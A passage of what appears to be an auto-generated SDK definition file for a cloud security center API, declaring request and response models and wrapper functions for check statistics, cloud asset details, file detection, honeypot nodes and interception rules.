    action = 'GetCheckDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckDetail(request: GetCheckDetailRequest): GetCheckDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckDetailWithOptions(request, runtime);
}

model GetCheckProcessRequest {
  taskId?: string(name='TaskId'),
}

model GetCheckProcessResponseBody = {
  finishCount?: int32(name='FinishCount'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model GetCheckProcessResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckProcessResponseBody(name='body'),
}

async function getCheckProcessWithOptions(request: GetCheckProcessRequest, runtime: Util.RuntimeOptions): GetCheckProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckProcess(request: GetCheckProcessRequest): GetCheckProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckProcessWithOptions(request, runtime);
}

model GetCheckRiskStatisticsRequest {
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
}

model GetCheckRiskStatisticsResponseBody = {
  count?: int32(name='Count'),
  data?: [ 
    {
      highWarningCount?: int32(name='HighWarningCount'),
      lowWarningCount?: int32(name='LowWarningCount'),
      mediumWarningCount?: int32(name='MediumWarningCount'),
      passCount?: int32(name='PassCount'),
      sceneName?: string(name='SceneName'),
      subStatistics?: [ 
        {
          alias?: string(name='Alias'),
          highWarningCount?: int32(name='HighWarningCount'),
          lowWarningCount?: int32(name='LowWarningCount'),
          mediumWarningCount?: int32(name='MediumWarningCount'),
          passCount?: int32(name='PassCount'),
          totalCount?: int32(name='TotalCount'),
          typeName?: string(name='TypeName'),
        }
      ](name='SubStatistics'),
      totalCount?: int32(name='TotalCount'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId'),
}

model GetCheckRiskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckRiskStatisticsResponseBody(name='body'),
}

async function getCheckRiskStatisticsWithOptions(request: GetCheckRiskStatisticsRequest, runtime: Util.RuntimeOptions): GetCheckRiskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckRiskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckRiskStatistics(request: GetCheckRiskStatisticsRequest): GetCheckRiskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckRiskStatisticsWithOptions(request, runtime);
}

model GetCheckSummaryRequest {
  lang?: string(name='Lang'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
}

model GetCheckSummaryResponseBody = {
  requestId?: string(name='RequestId'),
  summarys?: [ 
    {
      failCount?: int32(name='FailCount'),
      passCount?: long(name='PassCount'),
      standards?: [ 
        {
          failCount?: int32(name='FailCount'),
          id?: long(name='Id'),
          passCount?: int32(name='PassCount'),
          riskLevelHighCount?: int32(name='RiskLevelHighCount'),
          riskLevelLowCount?: int32(name='RiskLevelLowCount'),
          riskLevelMediumCount?: int32(name='RiskLevelMediumCount'),
          showName?: string(name='ShowName'),
        }
      ](name='Standards'),
      type?: string(name='Type'),
    }
  ](name='Summarys'),
}

model GetCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckSummaryResponseBody(name='body'),
}

async function getCheckSummaryWithOptions(request: GetCheckSummaryRequest, runtime: Util.RuntimeOptions): GetCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckSummary(request: GetCheckSummaryRequest): GetCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckSummaryWithOptions(request, runtime);
}

model GetClientUserDefineRuleRequest {
  id?: long(name='Id'),
}

model GetClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId'),
  userDefineRuleDetail?: {
    actionType?: string(name='ActionType'),
    cmdline?: string(name='Cmdline'),
    filePath?: string(name='FilePath'),
    gmtCreate?: long(name='GmtCreate'),
    gmtModified?: long(name='GmtModified'),
    IP?: string(name='IP'),
    id?: long(name='Id'),
    md5List?: string(name='Md5List'),
    name?: string(name='Name'),
    newFilePath?: string(name='NewFilePath'),
    parentCmdline?: string(name='ParentCmdline'),
    parentProcPath?: string(name='ParentProcPath'),
    platform?: string(name='Platform'),
    port?: int32(name='Port'),
    portStr?: string(name='PortStr'),
    procPath?: string(name='ProcPath'),
    registryContent?: string(name='RegistryContent'),
    registryKey?: string(name='RegistryKey'),
    type?: int32(name='Type'),
  }(name='UserDefineRuleDetail'),
}

model GetClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientUserDefineRuleResponseBody(name='body'),
}

async function getClientUserDefineRuleWithOptions(request: GetClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): GetClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClientUserDefineRule(request: GetClientUserDefineRuleRequest): GetClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClientUserDefineRuleWithOptions(request, runtime);
}

model GetCloudAssetCriteriaRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType'),
      assetType?: int32(name='AssetType'),
    }
  ](name='CloudAssetTypes'),
  value?: string(name='Value'),
}

model GetCloudAssetCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues'),
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model GetCloudAssetCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetCriteriaResponseBody(name='body'),
}

async function getCloudAssetCriteriaWithOptions(request: GetCloudAssetCriteriaRequest, runtime: Util.RuntimeOptions): GetCloudAssetCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetCriteria(request: GetCloudAssetCriteriaRequest): GetCloudAssetCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetCriteriaWithOptions(request, runtime);
}

model GetCloudAssetDetailRequest {
  assetSubType?: int32(name='AssetSubType'),
  assetType?: int32(name='AssetType'),
  cloudAssetInstances?: [ 
    {
      instanceId?: string(name='InstanceId'),
      regionId?: string(name='RegionId'),
    }
  ](name='CloudAssetInstances'),
  vendor?: int32(name='Vendor'),
}

model GetCloudAssetDetailResponseBody = {
  count?: int32(name='Count'),
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus'),
      assetSubType?: int32(name='AssetSubType'),
      assetSubTypeName?: string(name='AssetSubTypeName'),
      assetType?: int32(name='AssetType'),
      assetTypeName?: string(name='AssetTypeName'),
      createdTime?: long(name='CreatedTime'),
      detailLink?: string(name='DetailLink'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      regionId?: string(name='RegionId'),
      riskStatus?: string(name='RiskStatus'),
      securityInfo?: string(name='SecurityInfo'),
      vendor?: int32(name='Vendor'),
    }
  ](name='Instances'),
  requestId?: string(name='RequestId'),
}

model GetCloudAssetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetDetailResponseBody(name='body'),
}

async function getCloudAssetDetailWithOptions(request: GetCloudAssetDetailRequest, runtime: Util.RuntimeOptions): GetCloudAssetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetSubType)) {
    query['AssetSubType'] = request.assetSubType;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetInstances)) {
    query['CloudAssetInstances'] = request.cloudAssetInstances;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetDetail(request: GetCloudAssetDetailRequest): GetCloudAssetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetDetailWithOptions(request, runtime);
}

model GetCloudAssetSummaryResponseBody = {
  groupedFields?: {
    cloudAssetSummaryMetas?: [ 
      {
        assetSubType?: int32(name='AssetSubType'),
        assetType?: int32(name='AssetType'),
        instanceCount?: int32(name='InstanceCount'),
        instanceRiskCount?: int32(name='InstanceRiskCount'),
      }
    ](name='CloudAssetSummaryMetas'),
    instanceCountTotal?: int32(name='InstanceCountTotal'),
    instanceRiskCountTotal?: int32(name='InstanceRiskCountTotal'),
  }(name='GroupedFields'),
  requestId?: string(name='RequestId'),
}

model GetCloudAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetSummaryResponseBody(name='body'),
}

async function getCloudAssetSummaryWithOptions(runtime: Util.RuntimeOptions): GetCloudAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCloudAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetSummary(): GetCloudAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetSummaryWithOptions(runtime);
}

model GetClusterCheckItemWarningStatisticsRequest {
  clusterId?: string(name='ClusterId'),
}

model GetClusterCheckItemWarningStatisticsResponseBody = {
  data?: {
    highWarningCount?: int32(name='HighWarningCount'),
    lowWarningCount?: int32(name='LowWarningCount'),
    mediumWarningCount?: int32(name='MediumWarningCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model GetClusterCheckItemWarningStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterCheckItemWarningStatisticsResponseBody(name='body'),
}

async function getClusterCheckItemWarningStatisticsWithOptions(request: GetClusterCheckItemWarningStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterCheckItemWarningStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterCheckItemWarningStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterCheckItemWarningStatistics(request: GetClusterCheckItemWarningStatisticsRequest): GetClusterCheckItemWarningStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterCheckItemWarningStatisticsWithOptions(request, runtime);
}

model GetClusterRuleSummaryRequest {
  clusterId?: string(name='ClusterId'),
}

model GetClusterRuleSummaryResponseBody = {
  clusterRuleSummary?: {
    closeRuleCount?: int32(name='CloseRuleCount'),
    interceptionCount7Day?: long(name='InterceptionCount7Day'),
    interceptionSwitch?: int32(name='InterceptionSwitch'),
    interceptionType?: int32(name='InterceptionType'),
    openRuleCount?: int32(name='OpenRuleCount'),
    ruleCount?: int32(name='RuleCount'),
    suggestRuleCount?: int32(name='SuggestRuleCount'),
  }(name='ClusterRuleSummary'),
  requestId?: string(name='RequestId'),
}

model GetClusterRuleSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterRuleSummaryResponseBody(name='body'),
}

async function getClusterRuleSummaryWithOptions(request: GetClusterRuleSummaryRequest, runtime: Util.RuntimeOptions): GetClusterRuleSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterRuleSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterRuleSummary(request: GetClusterRuleSummaryRequest): GetClusterRuleSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterRuleSummaryWithOptions(request, runtime);
}

model GetClusterSuspEventStatisticsRequest {
  clusterId?: string(name='ClusterId'),
  from?: string(name='From'),
}

model GetClusterSuspEventStatisticsResponseBody = {
  requestId?: string(name='RequestId'),
  suspStatistics?: {
    remind?: int32(name='Remind'),
    serious?: int32(name='Serious'),
    suspicious?: int32(name='Suspicious'),
  }(name='SuspStatistics'),
}

model GetClusterSuspEventStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterSuspEventStatisticsResponseBody(name='body'),
}

async function getClusterSuspEventStatisticsWithOptions(request: GetClusterSuspEventStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterSuspEventStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterSuspEventStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterSuspEventStatistics(request: GetClusterSuspEventStatisticsRequest): GetClusterSuspEventStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterSuspEventStatisticsWithOptions(request, runtime);
}

model GetFileDetectApiInvokeInfoResponseBody = {
  data?: {
    authCount?: long(name='AuthCount'),
    expire?: long(name='Expire'),
    flowRate?: int32(name='FlowRate'),
    remainAuthCount?: long(name='RemainAuthCount'),
    saleVersion?: int32(name='SaleVersion'),
    timeUnit?: string(name='TimeUnit'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model GetFileDetectApiInvokeInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectApiInvokeInfoResponseBody(name='body'),
}

async function getFileDetectApiInvokeInfoWithOptions(runtime: Util.RuntimeOptions): GetFileDetectApiInvokeInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileDetectApiInvokeInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getFileDetectApiInvokeInfo(): GetFileDetectApiInvokeInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectApiInvokeInfoWithOptions(runtime);
}

model GetFileDetectResultRequest {
  hashKeyList?: [ string ](name='HashKeyList'),
  sourceIp?: string(name='SourceIp'),
  type?: int32(name='Type'),
}

model GetFileDetectResultResponseBody = {
  requestId?: string(name='RequestId'),
  resultList?: [ 
    {
      code?: string(name='Code'),
      ext?: string(name='Ext'),
      hashKey?: string(name='HashKey'),
      message?: string(name='Message'),
      result?: int32(name='Result'),
      score?: int32(name='Score'),
      virusType?: string(name='VirusType'),
    }
  ](name='ResultList'),
}

model GetFileDetectResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectResultResponseBody(name='body'),
}

async function getFileDetectResultWithOptions(request: GetFileDetectResultRequest, runtime: Util.RuntimeOptions): GetFileDetectResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileDetectResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getFileDetectResult(request: GetFileDetectResultRequest): GetFileDetectResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectResultWithOptions(request, runtime);
}

model GetHoneypotNodeRequest {
  nodeId?: string(name='NodeId'),
}

model GetHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  honeypotNode?: {
    allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet'),
    createTime?: string(name='CreateTime'),
    ecsInstanceId?: string(name='EcsInstanceId'),
    honeypotTotalCount?: int32(name='HoneypotTotalCount'),
    honeypotUsedCount?: int32(name='HoneypotUsedCount'),
    nodeId?: string(name='NodeId'),
    nodeIp?: string(name='NodeIp'),
    nodeName?: string(name='NodeName'),
    probeTotalCount?: int32(name='ProbeTotalCount'),
    probeUsedCount?: int32(name='ProbeUsedCount'),
    securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
    totalStatus?: int32(name='TotalStatus'),
    upgradeAvailable?: boolean(name='UpgradeAvailable'),
  }(name='HoneypotNode'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotNodeResponseBody(name='body'),
}

async function getHoneypotNodeWithOptions(request: GetHoneypotNodeRequest, runtime: Util.RuntimeOptions): GetHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotNode(request: GetHoneypotNodeRequest): GetHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotNodeWithOptions(request, runtime);
}

model GetHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId'),
  lang?: string(name='Lang'),
}

model GetHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  data?: {
    controlNodeName?: string(name='ControlNodeName'),
    fileInfoList?: [ 
      {
        fileId?: string(name='FileId'),
        fileName?: string(name='FileName'),
        ossUrl?: string(name='OssUrl'),
      }
    ](name='FileInfoList'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName'),
    honeypotPresetId?: string(name='HoneypotPresetId'),
    meta?: string(name='Meta'),
    nodeId?: string(name='NodeId'),
    presetName?: string(name='PresetName'),
    presetType?: string(name='PresetType'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotPresetResponseBody(name='body'),
}

async function getHoneypotPresetWithOptions(request: GetHoneypotPresetRequest, runtime: Util.RuntimeOptions): GetHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotPreset(request: GetHoneypotPresetRequest): GetHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotPresetWithOptions(request, runtime);
}

model GetHoneypotProbeRequest {
  probeId?: string(name='ProbeId'),
}

model GetHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  data?: {
    arp?: boolean(name='Arp'),
    canListenIpList?: [ string ](name='CanListenIpList'),
    cidrList?: [ string ](name='CidrList'),
    controlNode?: {
      ecsInstanceId?: string(name='EcsInstanceId'),
      nodeId?: string(name='NodeId'),
      nodeName?: string(name='NodeName'),
    }(name='ControlNode'),
    cpuLoad?: double(name='CpuLoad'),
    deployTime?: long(name='DeployTime'),
    displayName?: string(name='DisplayName'),
    honeyPotProbeScanPort?: {
      id?: long(name='Id'),
      ports?: string(name='Ports'),
      probeId?: string(name='ProbeId'),
      serviceIpList?: [ string ](name='ServiceIpList'),
      status?: int32(name='Status'),
    }(name='HoneyPotProbeScanPort'),
    honeypotProbeBindList?: [ 
      {
        bindId?: string(name='BindId'),
        bindPortList?: [ 
          {
            bindPort?: boolean(name='BindPort'),
            endPort?: int32(name='EndPort'),
            err?: string(name='Err'),
            fixed?: boolean(name='Fixed'),
            id?: long(name='Id'),
            msg?: string(name='Msg'),
            proto?: string(name='Proto'),
            startPort?: int32(name='StartPort'),
            status?: int32(name='Status'),
            targetPort?: int32(name='TargetPort'),
          }
        ](name='BindPortList'),
        honeypotId?: string(name='HoneypotId'),
        serviceIpList?: [ string ](name='ServiceIpList'),
        status?: int32(name='Status'),
      }
    ](name='HoneypotProbeBindList'),
    hostIp?: string(name='HostIp'),
    listenIpList?: [ string ](name='ListenIpList'),
    memoryLoad?: double(name='MemoryLoad'),
    osType?: string(name='OsType'),
    ping?: boolean(name='Ping'),
    probeId?: string(name='ProbeId'),
    probeType?: string(name='ProbeType'),
    probeVersion?: string(name='ProbeVersion'),
    proxyIp?: string(name='ProxyIp'),
    status?: int32(name='Status'),
    uuid?: string(name='Uuid'),
    vpcId?: string(name='VpcId'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotProbeResponseBody(name='body'),
}

async function getHoneypotProbeWithOptions(request: GetHoneypotProbeRequest, runtime: Util.RuntimeOptions): GetHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotProbe(request: GetHoneypotProbeRequest): GetHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotProbeWithOptions(request, runtime);
}

model GetImageScanNumInPeriodRequest {
  pastDay?: string(name='PastDay'),
}

model GetImageScanNumInPeriodResponseBody = {
  imageScanData?: {
    imageScanCount?: int32(name='ImageScanCount'),
  }(name='ImageScanData'),
  requestId?: string(name='RequestId'),
}

model GetImageScanNumInPeriodResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetImageScanNumInPeriodResponseBody(name='body'),
}

async function getImageScanNumInPeriodWithOptions(request: GetImageScanNumInPeriodRequest, runtime: Util.RuntimeOptions): GetImageScanNumInPeriodResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pastDay)) {
    query['PastDay'] = request.pastDay;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetImageScanNumInPeriod',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getImageScanNumInPeriod(request: GetImageScanNumInPeriodRequest): GetImageScanNumInPeriodResponse {
  var runtime = new Util.RuntimeOptions{};
  return getImageScanNumInPeriodWithOptions(request, runtime);
}

model GetInterceptionRuleDetailRequest {
  clusterId?: string(name='ClusterId'),
  ruleId?: string(name='RuleId'),
}

model GetInterceptionRuleDetailResponseBody = {
  interceptionRuleDetail?: {
    dstTarget?: {
      appName?: string(name='AppName'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace'),
      ports?: [ string ](name='Ports'),
      ruleType?: string(name='RuleType'),
      tagList?: [ string ](name='TagList'),
      targetId?: int32(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
    }(name='DstTarget'),
    interceptType?: long(name='InterceptType'),
    orderIndex?: long(name='OrderIndex'),
    ruleId?: long(name='RuleId'),
    ruleName?: string(name='RuleName'),
    ruleSwitch?: int32(name='RuleSwitch'),
    ruleType?: string(name='RuleType'),
    srcTarget?: {
      appName?: string(name='AppName'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace'),
      ruleType?: string(name='RuleType'),
      tagList?: [ string ](name='TagList'),
      targetId?: int32(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
    }(name='SrcTarget'),
  }(name='InterceptionRuleDetail'),
  requestId?: string(name='RequestId'),
}

model GetInterceptionRuleDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionRuleDetailResponseBody(name='body'),
}

async function getInterceptionRuleDetailWithOptions(request: GetInterceptionRuleDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionRuleDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionRuleDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
